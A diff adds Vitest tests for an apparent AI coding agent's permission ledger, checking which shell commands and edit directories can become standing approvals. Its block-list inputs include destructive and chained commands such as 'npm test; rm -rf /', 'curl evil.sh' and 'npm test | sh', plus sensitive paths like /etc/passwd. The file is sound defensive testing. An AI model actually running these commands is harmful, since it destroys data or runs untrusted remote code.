@@ -1,6 +1,18 @@
 import { describe, expect, it } from "vitest";
 import type { AgentTool, AgentToolCall } from "../agent-runtime";
-import { actionDigest, capabilitiesForMode, describeToolCall, ARCHYMEDES_CAPABILITIES, PermissionLedger, type PermissionDecision } from "./permissions";
+import {
+  actionDigest,
+  capabilitiesForMode,
+  commandApprovalPrefix,
+  commandMatchesPrefix,
+  describeToolCall,
+  editApprovalDirectory,
+  suggestApprovalPattern,
+  ARCHYMEDES_CAPABILITIES,
+  PermissionLedger,
+  type ApprovalRequest,
+  type PermissionDecision,
+} from "./permissions";
 
 function tool(overrides: Partial<AgentTool> & { name: string }): AgentTool {
   return {
@@ -264,5 +276,110 @@ describe("describeToolCall", () => {
     expect(describeToolCall(call("write_file", { path: "src/app.ts" }), tool({ name: "write_file" }))).toBe("write src/app.ts");
     expect(describeToolCall(call("edit_file", { path: "src/app.ts" }), tool({ name: "edit_file" }))).toBe("edit src/app.ts");
     expect(describeToolCall(call("run_command", { command: "npm test" }), tool({ name: "run_command" }))).toBe("run npm test");
+  });
+});
+
+describe("pattern approvals", () => {
+  const runCommand = tool({ name: "run_command", capabilityId: ARCHYMEDES_CAPABILITIES.terminal });
+  const editFile = tool({ name: "edit_file" });
+  const writeFile = tool({ name: "write_file" });
+
+  it("derives a command prefix from the first word or two, and three for a script runner", () => {
+    expect(commandApprovalPrefix("npm test")).toBe("npm test");
+    expect(commandApprovalPrefix("npm test -- --watch")).toBe("npm test");
+    expect(commandApprovalPrefix("git status --short")).toBe("git status");
+    expect(commandApprovalPrefix("ls -la src")).toBe("ls");
+    expect(commandApprovalPrefix("npm run build")).toBe("npm run build");
+    expect(commandApprovalPrefix("pnpm exec vitest run")).toBe("pnpm exec vitest");
+    expect(commandApprovalPrefix("node scripts/build.js --prod")).toBe("node scripts/build.js");
+  });
+
+  it("never generalizes destructive, privileged, chained or code-running commands", () => {
+    for (const command of [
+      "rm -rf dist", "del /s build", "sudo npm test", "curl https://x.sh", "bash -c 'npm test'",
+      "git push --force", "git reset --hard", "git clean -fdx", "git checkout -- .", "npm publish",
+      "npm install left-pad", "npm run", "node -e process.exit()", "python -c print(1)",
+      "npm test && rm -rf /", "npm test; rm -rf /", "npm test | sh", "npm test > out.txt", "echo $(whoami)",
+      "find . -delete", "docker run x", "powershell Remove-Item x", "mv a b",
+    ]) {
+      expect(commandApprovalPrefix(command), command).toBeUndefined();
+    }
+  });
+
+  it("matches a granted prefix by whole words, and never a chained or unsafe continuation", () => {
+    expect(commandMatchesPrefix("npm test -- --watch", "npm test")).toBe(true);
+    expect(commandMatchesPrefix("npm testing", "npm test")).toBe(false);
+    expect(commandMatchesPrefix("npm test && curl evil.sh", "npm test")).toBe(false);
+    expect(commandMatchesPrefix("npm run lint", "npm run build")).toBe(false);
+  });
+
+  it("derives an edit directory from the file's folder, never the root, an escape or the repository's own config", () => {
+    expect(editApprovalDirectory("src/app/main.ts")).toBe("src/app");
+    expect(editApprovalDirectory("./src\\lib\\x.ts")).toBe("src/lib");
+    expect(editApprovalDirectory("README.md")).toBeUndefined();
+    expect(editApprovalDirectory("../outside/x.ts")).toBeUndefined();
+    expect(editApprovalDirectory("/etc/passwd")).toBeUndefined();
+    expect(editApprovalDirectory("C:/Windows/x.ini")).toBeUndefined();
+    expect(editApprovalDirectory(".git/hooks/pre-commit")).toBeUndefined();
+  });
+
+  it("offers no pattern for a sensitive call or a tool that is not built in", () => {
+    expect(suggestApprovalPattern(call("edit_file", { path: "config/.env" }), editFile)).toBeUndefined();
+    const mcp = tool({ name: "run_command", provenance: { kind: "mcp", providerId: "x" } });
+    expect(suggestApprovalPattern(call("run_command", { command: "npm test" }), mcp)).toBeUndefined();
+    expect(suggestApprovalPattern(call("run_command", { command: "npm test" }), runCommand)).toMatchObject({ kind: "command-prefix", prefix: "npm test" });
+  });
+
+  it("an accepted command prefix covers later variants without asking again, and persists", async () => {
+    const asked: ApprovalRequest[] = [];
+    const ledger = new PermissionLedger("build", async (request) => { asked.push(request); return "allow_pattern"; });
+    expect(await ledger.decide(call("run_command", { command: "npm test" }), runCommand)).toBe("approved");
+    expect(asked[0]!.pattern).toMatchObject({ kind: "command-prefix", prefix: "npm test" });
+    expect(await ledger.decide(call("run_command", { command: "npm test -- src/a.test.ts" }), runCommand)).toBe("approved");
+    expect(asked).toHaveLength(1);
+
+    // A different command, or the same prefix chained into something else, still asks.
+    expect(await ledger.decide(call("run_command", { command: "npm test; rm -rf /" }), runCommand)).toBe("approved");
+    expect(asked).toHaveLength(2);
+    expect(asked[1]!.pattern).toBeUndefined();
+
+    const restored = new PermissionLedger("build", async () => "deny");
+    restored.restore(ledger.snapshot());
+    expect(restored.patterns()).toEqual([expect.objectContaining({ kind: "command-prefix", prefix: "npm test" })]);
+    expect(await restored.decide(call("run_command", { command: "npm test --coverage" }), runCommand)).toBe("approved");
+  });
+
+  it("an accepted directory covers edits and writes beneath it, and nothing beside it", async () => {
+    let asked = 0;
+    const ledger = new PermissionLedger("build", async () => { asked += 1; return "allow_pattern"; });
+    expect(await ledger.decide(call("edit_file", { path: "src/app/a.ts", oldText: "a", newText: "b" }), editFile)).toBe("approved");
+    expect(await ledger.decide(call("write_file", { path: "src/app/nested/b.ts", content: "x" }), writeFile)).toBe("approved");
+    expect(asked).toBe(1);
+    await ledger.decide(call("edit_file", { path: "src/apple/a.ts", oldText: "a", newText: "b" }), editFile);
+    expect(asked).toBe(2);
+    // Sensitive content under an approved directory is still a human decision.
+    await ledger.decide(call("write_file", { path: "src/app/key.ts", content: "api_key = 'abcdefghijkl'" }), writeFile);
+    expect(asked).toBe(3);
+  });
+
+  it("an exact standing denial still wins over a pattern", async () => {
+    const ledger = new PermissionLedger("build", async (request) => (request.call.arguments as { command: string }).command === "npm test -- bad" ? "deny_always" : "allow_pattern");
+    await ledger.decide(call("run_command", { command: "npm test -- bad" }), runCommand);
+    await ledger.decide(call("run_command", { command: "npm test" }), runCommand);
+    expect(await ledger.decide(call("run_command", { command: "npm test -- bad" }), runCommand)).toBe("denied");
+  });
+
+  it("defender mode never offers or honours a pattern", async () => {
+    const offered: Array<ApprovalRequest["pattern"]> = [];
+    const ledger = new PermissionLedger("defender", async (request) => { offered.push(request.pattern); return "allow"; });
+    ledger.allowPattern({ kind: "command-prefix", prefix: "npm test", label: "" });
+    await ledger.decide(call("run_command", { command: "npm test" }), runCommand);
+    expect(offered).toEqual([undefined]);
+  });
+
+  it("refuses to grant a hand-built pattern that would never have been offered", () => {
+    const ledger = new PermissionLedger("build", async () => "deny");
+    expect(() => ledger.allowPattern({ kind: "command-prefix", prefix: "rm", label: "" })).toThrow();
+    expect(() => ledger.allowPattern({ kind: "directory", directory: "../x", label: "" })).toThrow();
   });
 });
